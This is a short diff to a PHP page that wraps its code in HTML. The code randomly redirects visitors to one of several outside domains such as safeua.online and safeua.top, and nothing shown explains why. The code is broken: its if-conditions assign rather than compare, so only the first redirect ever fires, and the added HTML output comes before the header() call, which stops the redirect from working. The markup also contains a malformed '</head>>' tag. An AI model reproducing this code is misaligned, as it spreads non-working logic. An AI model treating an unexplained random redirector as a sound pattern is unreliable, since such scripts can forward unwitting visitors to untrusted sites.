@@ -1,4 +1,9 @@
-<?
+<html>
+<head>
+</head>>
+
+
+<body><?
 $num=rand(1, 5) ;
 if ($num=1){
 	header("Location: http://safeua.online");
@@ -16,3 +21,5 @@ elseif ($num=5){
 	header("Location: https://safeua.top");
 }
 ?>
+</body>
+</html>
